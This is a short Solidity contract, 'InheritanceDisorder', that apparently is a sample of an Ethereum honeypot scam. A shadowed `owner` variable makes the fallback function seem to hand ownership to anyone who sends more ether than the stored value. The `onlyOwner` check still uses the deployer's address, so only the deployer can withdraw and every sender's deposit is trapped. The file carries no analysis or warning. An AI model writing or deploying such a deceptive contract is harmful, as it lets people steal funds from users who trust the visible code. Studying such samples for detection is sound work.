pragma solidity ^0.4.19;

contract Ownable {
  address public owner = msg.sender;
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
}

contract InheritanceDisorder is Ownable {

    address public owner;
    uint public value;

    // Function to withdraw tokens from the honeypot
    function withdrawTokens() public onlyOwner {
        msg.sender.transfer(this.balance);
        value = 0;
    }

    // Function to retrieve the contract balance
    function getContractBalance() public view returns (uint) {
        return this.balance;
    }

    // Fallback function to accept Ether
    function() public payable {
        if(msg.value > value){
            owner = msg.sender;
            value += msg.value;
        }
    }
}
